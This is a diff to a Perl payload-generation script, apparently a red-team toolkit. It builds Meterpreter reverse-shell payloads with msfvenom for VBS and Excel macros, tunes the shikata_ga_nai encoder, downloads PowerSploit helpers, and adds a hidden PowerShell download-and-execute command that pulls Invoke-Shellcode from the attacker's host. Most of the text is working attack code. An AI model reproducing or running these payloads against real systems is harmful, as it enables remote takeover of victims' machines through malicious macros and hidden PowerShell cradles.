@@ -4,7 +4,7 @@ use warnings;
 
   my($fileNdx, $LHOST, $LPORT, $targetFolder, $IoE);
   my($payload, $platform_arch , $commandControl );
-  my($currentFileName, $encoder,$cmd);
+  my($currentFileName, $encoder,$cmd, $OUTFILE);
 
   $targetFolder="/opt/local/malwaredefense";
   `mkdir -p $targetFolder`;
@@ -52,12 +52,16 @@ use warnings;
    $cmd = "msfvenom ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/013-Stalwart-Meterpreter.vbs";
    print "\n\n*** Meterpreter vbs  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
+  
 
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/014-Stalwart-Meterpreter.vba";
+  #tuning encoder down to 3 for VBA
+  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/014-Stalwart-Meterpreter.vba";
   print "\n\n*** Meterpreter vba  (Paste into Excel Macro): $cmd\n";
   `$cmd`;
 
 
+  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
 
 
   print "Copy the Invoke-shellcode.ps1 to the target directory \n";
@@ -70,9 +74,12 @@ use warnings;
     `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
   }
   my ($ShellCodePath) ="./701_Invoke-Shellcode.ps1";
-  `cp $ShellCodePath $targetFolder/Invoke-Shellcode.ps1`;
-  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/Invoke-Shellcode.ps1`;
-
+  `cp $ShellCodePath $targetFolder/200_Invoke-Shellcode.ps1`;
+  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/200_Invoke-Shellcode.ps1`;
+  $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/200_Invoke-Shellcode.ps1'))";
+  open( $OUTFILE, '>', "$targetFolder/201_PScommand.txt");
+  print $OUTFILE $cmd;
+  close $OUTFILE;
  
 #Needs additional work
 #  print "\n\n*** Meterpreter Java  (Paste into Java and compile) \n";
